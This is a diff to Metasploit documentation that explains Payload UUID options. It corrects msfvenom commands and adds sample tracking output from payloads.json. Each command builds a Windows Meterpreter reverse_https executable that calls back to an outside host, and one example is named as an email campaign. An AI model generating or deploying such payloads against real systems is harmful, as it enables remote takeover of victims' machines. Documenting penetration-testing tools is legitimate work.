@@ -9,19 +9,33 @@ The goal of Payload UUIDs is three-fold:
 
 Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the ```PayloadUUIDRaw``` option. This option takes a 8-byte hex string, such as "0011223344556677". For example:
 ```
-$ ./msfvenom windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
+$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
 ```
 
 Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option:
 ```
-$ ./msfvenom windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
+$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
 ```
 
 
 Payload UUIDs are enabled by default, but are not tracked unless the ```PayloadUUIDTracking``` option is set to ```true```. Setting this option causes a new entry to be created in ```~/.msf4/payloads.json``` when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the ```PayloadUUIDName```. The example below will create a new registered payload with a custom name:
 
 ```
-$ ./msfvenom windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
-```
+$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
 
+$ cat ~/.msf4/payloads.json 
+{
+  "09e642e7c0fc235a": {
+    "arch": "x86",
+    "platform": "windows",
+    "timestamp": 1435276808,
+    "payload": "payload/windows/meterpreter/reverse_https",
+    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"example.com","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
+    "name": "EmailCampaign20150101",
+    "urls": [
+  "/CeZC58D8I1qT_JL9xnAF9A7AvWT8e_QNB3MWqY8nvNRN82crZWqoXKr25Ej7XR87IbnnwUwC2bwG9LIIh1tVUTMf1fwag0F7m6mk0iv-u4M9h40elV0aPD7d3genb1ofVEwKV-L2SXG-DYXJnkiH7gPeA_rCTHHfAn-Ayl2ETblQp5lVH-12tZjVIFGWVfFEDMWYnAKBzKmb4jMcrdTQP2u_fM"
+]
+}
+}
+```
 
